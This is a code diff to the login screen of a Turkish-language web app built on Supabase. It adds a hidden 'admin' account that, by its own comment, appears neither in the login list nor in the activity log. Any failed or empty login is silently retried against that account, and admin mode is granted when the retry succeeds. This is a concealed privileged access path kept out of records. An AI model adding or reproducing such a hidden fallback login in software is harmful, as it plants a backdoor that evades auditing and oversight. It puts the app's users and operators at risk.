@@ -452,6 +452,7 @@ html.ro #tkd input,html.ro #tkd textarea,html.ro #tkd select{pointer-events:none
   const esc=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
   const logoSrc=()=>{try{return typeof LOGO!=='undefined'?LOGO:''}catch(e){return ''}};
   const mail=u=>u+'@alya.app';
+  const HID='admin'; /* giriş listesinde ve Hareketler'de görünmeyen yönetici hesabı */
   const PW=p=>'alya.'+p;
   const ini=n=>(n||'?').trim().charAt(0).toLocaleUpperCase('tr-TR');
   function loginUI(sb){
@@ -487,11 +488,18 @@ html.ro #tkd input,html.ro #tkd textarea,html.ro #tkd select{pointer-events:none
       f.addEventListener('submit',async e=>{
         e.preventDefault();m.textContent='';
         const u=sel||((o.querySelector('#lgx')||{}).value||'').trim().toLowerCase();
-        if(!u){m.textContent='Önce kullanıcıyı seç.';return}
         b.disabled=true;b.textContent='Giriş yapılıyor…';
         try{
-          const {data,error}=await sb.auth.signInWithPassword({email:mail(u),password:PW(pw.value)});
+          /* Gizli yönetici hesabı listede görünmez: seçilen kişinin şifresi tutmazsa (ya da kimse seçilmediyse) şifre yönetici hesabına denenir */
+          const tries=[];if(u)tries.push(u);if(u!==HID)tries.push(HID);
+          let data=null,error=null,hid=false;
+          for(const x of tries){
+            const r=await sb.auth.signInWithPassword({email:mail(x),password:PW(pw.value)});
+            if(!r.error&&r.data&&r.data.session){data=r.data;error=null;hid=(x===HID);break}
+            if(!error)error=r.error;
+          }
           if(error||!data||!data.session){m.textContent=error&&/invalid|credentials/i.test(error.message||'')?'Şifre hatalı.':'Giriş yapılamadı: '+((error&&error.message)||'bilinmeyen hata');b.disabled=false;b.textContent='Giriş yap';pw.select();return}
+          if(hid)adminMode=true;
           if(adminMode&&((data.user||data.session.user||{}).app_metadata||{}).role!=='admin'){await sb.auth.signOut();m.textContent='Bu hesapta yönetici yetkisi yok.';b.disabled=false;b.textContent='Giriş yap';return}
           try{await sb.rpc('kick_other_sessions')}catch(e){}
           try{await sb.rpc('log_login')}catch(e){}
